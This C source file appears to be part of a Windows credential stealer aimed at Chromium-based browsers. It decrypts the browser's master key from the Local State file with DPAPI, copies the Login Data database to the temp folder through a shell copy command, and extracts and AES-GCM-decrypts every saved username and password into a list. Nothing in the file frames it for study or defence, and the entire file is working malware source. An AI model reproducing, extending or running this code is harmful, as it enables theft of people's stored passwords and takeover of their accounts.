#include "chromium.h"
#include "json/json.h"

errno_t errnum;

ChromiumBrowser initChromium( char *local_state, char *login_data, char* name)
{
    ChromiumBrowser browser;
    browser.localState = local_state;
    browser.loginData = login_data;
    browser.name = name;
    return browser;
}

unsigned char* getChromiumMasterKey(ChromiumBrowser* browser)
{
    char* buffer = malloc(sizeof *buffer * 1);
    if( buffer == NULL )
    {
#ifdef DEBUG
        fprintf(stderr, "Memory Allocation Error!\n");
#endif
        return NULL;
    }

    FILE* fpLocalState;
    errnum = fopen_s(&fpLocalState, browser->localState, "r");
    if( errnum != 0 )
    {
#ifdef DEBUG
        fprintf(stderr, "Could'nt open Local State file\n");
#endif
        free(buffer);
        return NULL;
    }

    int x = 0;
    while(!feof(fpLocalState))
    {
        buffer = realloc(buffer, sizeof *buffer * (x+1) );
        if(buffer == NULL) {
            fclose(fpLocalState);
#ifdef DEBUG
            fprintf(stderr, "Memory Allocation Error!\n");
#endif
            return NULL;
        }
        *(buffer + x) = fgetc(fpLocalState);
        x++;
    }

    fclose(fpLocalState);

    buffer = realloc(buffer, sizeof *buffer * (x+1));

    if(buffer == NULL)
    {
#ifdef DEBUG
        fprintf(stderr, "Memory Allocation Error!\n");
#endif
        return NULL;
    }

    *( buffer + x-1 ) = 0;
    

    JsonNode* root = json_decode(buffer);
    JsonNode* os_crypt = json_find_member(root, "os_crypt");
    JsonNode* encrypted_key = json_find_member(os_crypt, "encrypted_key");

    free(buffer);
    buffer = encrypted_key->string_;

    size_t size;
    unsigned char* key = base64_decode(buffer, strlen(buffer), &size);

    free(buffer);

    DATA_BLOB encrypted;
    encrypted.pbData = key + 5;
    encrypted.cbData = size - 5;

    DATA_BLOB decrypted;

    if(!CryptUnprotectData(&encrypted, NULL, NULL, NULL, NULL, 0, &decrypted))
    {
#ifdef DEBUG
        fprintf(stderr, "Error Decrypting: %ld\n", GetLastError());
#endif
        return NULL;
    }

    free(key);

    return decrypted.pbData;
}


credList* getChromiumCredentials(ChromiumBrowser* browser, unsigned char* MasterKey)
{
    credList* List = calloc(1, sizeof(credList));
    List->size = 0;

    char* tempFolder = getenv("TEMP");

    // Make File Path
    char* dbFormat = "%s\\%s.db\x00";
    char* dbFile = malloc(
            strlen(tempFolder)+
            strlen(browser->name)+
            5);
    sprintf(dbFile, dbFormat, tempFolder, browser->name);

    // Execute Copy Command to move data to %TMP%
    char* commandFormat = "copy \"%s\" \"%s\">nul\x00";
    char* command = malloc(
            strlen(browser->loginData)+
            strlen(dbFile)+
            15
            );

    sprintf(command, commandFormat,
            browser->loginData, dbFile);

    // Command Execution
    if(system(command) != 0)
    {
#ifdef DEBUG
        fprintf(stderr, "Could'nt Copy Database, Maybe not Exist\n");
#endif
        return List;
    }

    free(command);
    
    sqlite3* db;
    int rc = sqlite3_open(dbFile, &db);

    if( rc != SQLITE_OK ) {
#ifdef DEBUG
        fprintf(stderr, "Can't open database: %s\n", sqlite3_errmsg(db));
#endif
        return List;
    }
#ifdef DEBUG
    else
        fprintf(stderr, "Opened database successfully\n");
#endif

    char* query = "SELECT signon_realm, username_value, password_value, length(hex(password_value))/2, blacklisted_by_user FROM logins";

    List->creds = calloc(1, sizeof(Credential));

    sqlite3_stmt* stmt;

    rc = sqlite3_prepare_v2(db, query, -1, &stmt, NULL);
    if( rc != SQLITE_OK ){
#ifdef DEBUG
        fprintf(stderr, "Could'nt Prepare query\n");
#endif
        return List;
    }
#ifdef DEBUG
    else
        fprintf(stderr, "Prepared database successfully\n");
#endif

    if(sodium_init() == 0)
#ifdef DEBUG
        fprintf(stderr, "Initialized\n");
    else
        fprintf(stderr, "Could'nt Initialize Maybe Initialized Before?!\n");
#else
        printf("");
#endif

    while(sqlite3_step(stmt) != SQLITE_DONE)
    {
        if(List->size != 0)
            List->creds = realloc(List->creds, sizeof(Credential) * (List->size+1));
        
        Credential* this = (List->creds + List->size);
        const unsigned char* url = sqlite3_column_text(stmt, 0);
        const unsigned char* username = sqlite3_column_text(stmt, 1);
        const void* password = sqlite3_column_blob(stmt, 2);
        int passSize = sqlite3_column_int(stmt, 3);
        int blacklisted = sqlite3_column_int(stmt, 4);

        if(blacklisted)
            continue;

        if(!(passSize > 0) && !(strlen((char*) username) > 0))
            continue;

        this->url = calloc(strlen((char*) url)+1, sizeof(char));
        if(this->url == NULL) {
#ifdef DEBUG
            fprintf(stderr, "Memory Allocation Error!");
#endif
            return List;
        }

        strcpy(this->url, (const char*) url);
        this->url[strlen((char*) url)] = 0;

        this->username = calloc(strlen((char*) username)+1, sizeof(char));
        if(this->username == NULL) {
#ifdef DEBUG
            fprintf(stderr, "Memory Allocation Error!");
#endif
            return List;
        }

        strcpy(this->username, (const char*) username);
        this->username[strlen((char*) username)] = 0;

        size_t decrypted_len;
        int res;
        res = crypto_aead_aes256gcm_decrypt(
                NULL, &decrypted_len,
                NULL,
                (password+15), passSize-15,
                NULL,0,
                (password+3), MasterKey
            );


        char* decrypted = calloc(decrypted_len + 1, sizeof(char));
        if(decrypted == NULL) {
#ifdef DEBUG
            fprintf(stderr, "Memory Allocation Error!");
#endif
            return List;
        }

        res = crypto_aead_aes256gcm_decrypt(
                (unsigned char*)decrypted, &decrypted_len,
                NULL,
                (password+15), passSize-15,
                NULL,0,
                (password+3), MasterKey
            );

        if(res == 0){
            decrypted[decrypted_len] = 0;
            this->password = decrypted;
        }
        else 
        {
            free(decrypted);
            this->password = "Cannot Decrypt";
        }

        List->size++;
    }

    return List;
}



credList* dumpChromium(ChromiumBrowser *browser) {
    unsigned char* key = getChromiumMasterKey(browser);
    if(key == NULL) {
#ifdef DEBUG
        fprintf(stderr, "Error While Getting Master Key\n");
#endif
        return NULL;
    }

    credList* Credentials = getChromiumCredentials(browser, key);
    return Credentials;
}
